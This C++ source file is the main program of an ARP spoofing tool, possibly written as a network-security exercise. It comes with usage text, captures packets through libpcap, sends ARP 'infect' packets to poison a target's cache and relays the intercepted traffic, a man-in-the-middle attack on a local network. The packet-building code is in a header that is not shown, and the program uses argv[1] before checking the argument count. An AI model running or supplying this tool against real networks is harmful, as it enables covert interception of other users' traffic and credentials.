#include "main.h"
#include "arpSpoof.h"

// Print Usage
void usage() {
	cout << "Usage: arp_spoof <interface> <sender ip> <target ip>" << endl;
	cout << "sample: arp_spoof wlan0 10.0.0.1 10.0.0.2" << endl;
}

int main(int argc, char* argv[]) {
	ArpSpoof arp{ argv[1] };
	pcap_t* handle;
	char errbuf[PCAP_ERRBUF_SIZE];

	if (argc != 4) {
		usage();
		exit(EXIT_FAILURE);
	}

	handle = pcap_open_live(argv[1], BUFSIZ, PROMISCUOUS, 1024, errbuf);
	if (handle == NULL) {
		perror("pcap_open_live");
		exit(EXIT_FAILURE);
	}

	// 1. getting me and target MAC Address
	arp.setSenderMacAddress();
	arp.setTargetMacAddress(handle, argv[2], argv[3]);

	// 2. send ARP Packet to target for infect 
	arp.setEtherHeader();
	arp.setArpHeader();
	arp.sendInfectPacket();

	// 3. if receive packet of target, relay packet to target. 
	arp.receivePacketRelay();


	if (handle) pcap_close(handle);

	return 0;
}
